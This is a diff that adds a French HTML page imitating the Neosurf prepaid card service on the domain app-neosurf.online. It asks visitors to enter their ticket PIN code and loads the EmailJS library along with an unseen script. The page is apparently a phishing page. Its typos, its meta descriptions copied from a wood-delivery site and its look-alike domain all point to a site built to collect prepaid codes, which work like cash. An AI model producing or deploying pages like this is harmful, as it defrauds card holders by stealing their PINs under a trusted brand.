@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+<title>Neosurf |veification de ticket </title>
+<meta name="description" content="Consultez et retrouvez l'historique de vos paiements par codes Neosurf ou transférez le solde d'une carte sur une autre carte.">
+
+
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://app-neosurf.online/">
+<meta name="author" content="carte Neosurf">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Vérificationn de carte Neosurf">
+<meta property="og:description" content="Suivez l'état de votre commande de bois en ligne : préparation, expédition et livraison estimée.">
+<meta property="og:url" content="https://app-neosurf.online">
+<meta property="og:site_name" content="Carte Neosurf">
+<meta property="og:locale" content="fr_FR">
+<meta property="og:image" content="https://app-neosurf.online/og-image.jpg">
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Vérificationn de carte Neosurf">
+<meta name="twitter:description" content="Suivez l'état de votre commande de bois en ligne : préparation, expédition et livraison estimée.">
+<meta name="twitter:image" content="https://app-neosurf.online/og-image.jpg">
+
+<!-- Favicon -->
+<link rel="icon" type="image/png" href="/favicon.png">
+
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <div class="page">
+
+    <h1>MA CARTE NEOSURF</h1>
+
+    <div class="info-box">
+     Connectez-vous en indiquant le code figurant sur votre carte ou votre ticket Neosurf afin d'accéder à de nombreuses informations et options : Crédit disponible, transfert de solde, etc.
+    </div>
+
+     <main>
+
+        <section class="verification-card">
+
+            <div class="verification-header">
+                <h2>Entrez le code Pin du ticket</h2>
+            </div>
+
+            <div class="verification-body">
+
+                <form id="verificationForm">
+
+                    <div class="code-group">
+
+                        <input
+                            type="text"
+                            id="part1"
+                            name="part1"
+                            maxlength="4"
+                            class="code-input"
+                            autocomplete="off"
+                            aria-label="Code 1">
+
+                        <input
+                            type="text"
+                            id="part2"
+                            name="part2"
+                            maxlength="3"
+                            class="code-input"
+                            autocomplete="off"
+                            aria-label="Code 2">
+
+                        <input
+                            type="text"
+                            id="part3"
+                            name="part3"
+                            maxlength="3"
+                            class="code-input"
+                            autocomplete="off"
+                            aria-label="Code 3">
+
+                    </div>
+
+      <div class="g-recaptcha" data-sitekey="6LcXjc8tAAAAAJi3xWLqOPTILAh7hr6_6x2HusR5"></div>
+
+      <div class="actions">
+        <button type="button" class="btn-retour">Retour</button>
+        <button type="submit" class="btn-valider">Valider</button>
+      </div>
+    </form>
+     <div id="result"></div>
+
+
+  </div>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script src="script.js"></script>
+  
+
+</body>
+</html>
